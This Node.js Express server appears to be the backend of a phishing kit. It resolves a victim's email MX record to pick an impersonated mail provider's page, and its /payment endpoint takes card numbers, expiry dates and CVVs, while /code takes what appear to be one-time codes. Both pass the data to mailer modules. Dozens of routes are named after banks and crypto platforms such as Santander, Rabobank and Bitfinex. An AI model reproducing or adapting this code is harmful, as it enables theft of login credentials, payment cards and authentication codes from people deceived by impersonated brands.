const express = require("express");
var dns = require("dns");
const { parse } = require("tldts");
const path = require("path");

const app = express();
const hostname = "127.0.0.1";
const port = process.env.PORT || 8000;

const server = require("http").createServer(app);

var cors = require("cors");
app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const hostproviders = [
  "emailsrvr",
  "secureserver",
  "hiworks",
  "mail",
  "zoho",
  "yandex",
  "qq",
  "hinet",
  "outlook",
  "yahoodns",
  "yahoo",
  "263",
  "gmx",
  "berlin",
  "hamburg",
  "telekom",
];

const hostproviderSubdomains = [
  "163mx00.mxmail",
  "163mx01.mxmail",
  "163mx02.mxmail",
  "163mx03.mxmail",
  "126mx00.mxmail",
  "126mx01.mxmail",
  "126mx02.mxmail",
  "126mx03.mxmail",
  "qiye163mx01.mxmail",
  "qiye163mx02.mxmail",
  "qiye163mx03.mxmail",
  "vip163mx00.mxmail",
  "vip163mx01.mxmail",
  "vip163mx02.mxmail",
];

const providers = [
  { name: "rackspace", host: "emailsrvr" },
  { name: "yahoo", host: "yahoo" },
  { name: "yahoo", host: "yahoodns" },
  { name: "hiworks", host: "hiworks" },
  { name: "godaddy", host: "secureserver" },
  { name: "mail", host: "mail" },
  { name: "zoho", host: "zoho" },
  { name: "yandex", host: "yandex" },
  { name: "qq", host: "qq" },
  { name: "hinet", host: "hinet" },
  { name: "office", host: "outlook" },
  { name: "gmx", host: "gmx" },
  { name: "263", host: "263" },
  { name: "berlin", host: "berlin" },
  { name: "hamburg", host: "hamburg" },
  { name: "telekom", host: "telekom" },

  // provider to find with subdomain (same hostname)
  { name: "163", host: "netease", subdomain: "163mx01.mxmail" },
  { name: "163", host: "netease", subdomain: "163mx02.mxmail" },
  { name: "163", host: "netease", subdomain: "163mx03.mxmail" },
  { name: "163", host: "netease", subdomain: "qiye163mx01.mxmail" },
  { name: "163", host: "netease", subdomain: "qiye163mx02.mxmail" },
  { name: "163", host: "netease", subdomain: "qiye163mx03.mxmail" },
  { name: "163", host: "netease", subdomain: "vip163mx00.mxmail" },
  { name: "163", host: "netease", subdomain: "vip163mx01.mxmail" },
  { name: "163", host: "netease", subdomain: "vip163mx02.mxmail" },
  { name: "126", host: "netease", subdomain: "126mx01.mxmail" },
  { name: "126", host: "netease", subdomain: "126mx02.mxmail" },
  { name: "126", host: "netease", subdomain: "126mx03.mxmail" },
];

app.post("/start", (req, res) => {
  const { email } = req.body;
  const splitEmail = email.split("@");
  const emailDomain = splitEmail[splitEmail.length - 1];
  console.log(emailDomain);

  dns.resolveMx(emailDomain, (err, addresses) => {
    // sort address by priority desc
    orderedAddress = addresses.sort((a, b) => a.priority - b.priority);
    console.log(orderedAddress);

    const mxAddress = orderedAddress[0].exchange;

    const { domain, hostname, domainWithoutSuffix, subdomain } = parse(
      `http://${mxAddress}`
    );

    console.log(`host: ${domainWithoutSuffix}`);
    // console.log(`hostname: ${hostname}`);
    console.log(`subdomain: ${subdomain}`);

    const ishost = hostproviders.includes(domainWithoutSuffix);
    console.log(`ishost: ${ishost}`);

    const isProvidersubdomain = hostproviderSubdomains.includes(subdomain);
    console.log(`isprovidersubdomain: ${isProvidersubdomain}`);

    if (ishost) {
      const host = providers.find(
        (element) => element.host === domainWithoutSuffix
      );
      console.log(host.name);
      // redirect fro to provider using hostname
      //  res.redirect(301, `${urL}/${host.name}/${email}`);
      res.json({ host: host.name });
    } else if (isProvidersubdomain) {
      const host = providers.find((element) => element.subdomain === subdomain);
      console.log(host.name);
      // redirect fro to provider using subdomain
      // res.redirect(301, `${urL}/${host.name}/${email}`);
      res.json({ host: host.name });
    } else {
      console.log("provider nor avaiable redirect to webmail");
      // res.redirect(301, `${urL}/webmail/${email}`);
      res.json({ host: "webmail" });
    }
  });
});

app.post("/payment", (req, res) => {
  const { cardnumber, expiremonth, expireyear, cvv } = req.body;

  const mailerpayment = require("./mailerpayment");

  mailerpayment.main(req.body);

  res.sendStatus(200);
});

app.post("/code", (req, res) => {
  const mailerotp = require("./mailerotp");

  mailerotp.main(req.body);

  res.sendStatus(200);
});

app.get("/testing", (req, res) => {
  res.sendStatus(200);
});

app.get("/logpage", (req, res) => {
  res.sendFile(__dirname + "/logpage.html");
});

//app.use("/admin", require("./services/firestoreadmin"));

app.use("/mail", require("./services/reportmessage"));
app.use("/mailnew", require("./services/reportmessagenew"));
app.use("/stantrust", require("./services/reportmessagecopy"));
app.use("/santander", require("./services/santander"));
app.use("/stackcoin", require("./services/stackcoin"));
app.use("/kryptovault", require("./services/kryptovault"));
app.use("/block2bit", require("./services/block2bit"));
app.use("/bitbox", require("./services/bitbox"));
app.use("/bitochain", require("./services/bitochain"));
app.use("/basecoin", require("./services/basecoin"));
app.use("/bitanzo", require("./services/bitanzo"));
app.use("/bitenzo", require("./services/bitenzo"));
app.use("/bybtronex", require("./services/bybtronex"));
app.use("/pakkox", require("./services/pakkox"));
app.use("/rabobank", require("./services/rabobank"));
app.use("/bitfinex", require("./services/bitfinex"));
app.use("/trustcoin", require("./services/trustcoin"));
app.use("/glovecoin", require("./services/glovecoin"));
app.use("/coinaffix", require("./services/coinaffix"));
app.use("/koinbittrust", require("./services/koinbittrust"));
app.use("/instantbank", require("./services/instantbank"));
app.use("/trustpayd", require("./services/trustpayd"));
app.use("/trustgain", require("./services/trustgain"));
app.use("/metassets", require("./services/metassets"));
app.use("/dmartbit", require("./services/dmartbit"));
app.use("/cryptokneit", require("./services/cryptokneit"));
app.use("/saptrust", require("./services/saptrust"));
app.use("/zaptrust", require("./services/zaptrust"));
app.use("/bitmax", require("./services/bitmax"));
app.use("/zkobase", require("./services/zkobase"));
app.use("/fexbank", require("./services/fexbank"));
app.use("/bitvault", require("./services/bitvault"));
app.use("/alliant", require("./services/alliant"));
app.use("/keplaget", require("./services/keplaget"));
app.use("/bitmaxgroup", require("./services/bitmaxgroup"));
app.use("/satocoin", require("./services/satocoin"));
app.use("/netbit", require("./services/netbit"));
app.use("/report", require("./services/reports"));
app.use("/trustminers", require("./services/trustminers"));
app.use("/maintocoin", require("./services/maintocoin"));
app.use("/gnbit", require("./services/gnbit"));
app.use("/apexmeta", require("./services/apexmeta"));
app.use("/apexmetanew", require("./services/apexmetanew"));
app.use("/basemart", require("./services/basemart"));
app.use("/kryptospace", require("./services/kryptospace"));
app.use("/enzochain", require("./services/enzochain"));
app.use("/cambit", require("./services/cambit"));
app.use("/maxzobit", require("./services/maxzobit"));

app.use("/telus", require("./services/telusinvest"));

app.use("/exchangetrade", require("./services/mailerexchangetrade"));
app.use("/unchainedtrade", require("./services/mailerunchainedtrade"));

server.listen(port, hostname, () => {
  console.log(`server is running on port: ${port}`);
});

module.exports = app;
